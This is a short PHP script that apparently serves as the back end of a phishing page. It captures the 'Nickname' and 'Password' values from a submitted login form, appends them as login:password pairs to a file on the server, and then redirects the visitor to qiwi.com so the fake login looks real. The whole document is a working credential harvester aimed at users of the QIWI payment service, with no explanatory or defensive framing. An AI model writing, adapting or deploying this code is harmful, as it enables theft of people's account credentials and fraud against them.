<?PHP
$Log = $_POST['Nickname'];
$Pass = $_POST['Password'];
$log = fopen("file.php","a+");
fwrite($log,"\n $Log:$Pass \n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=qiwi.com/'></head></html>";
?>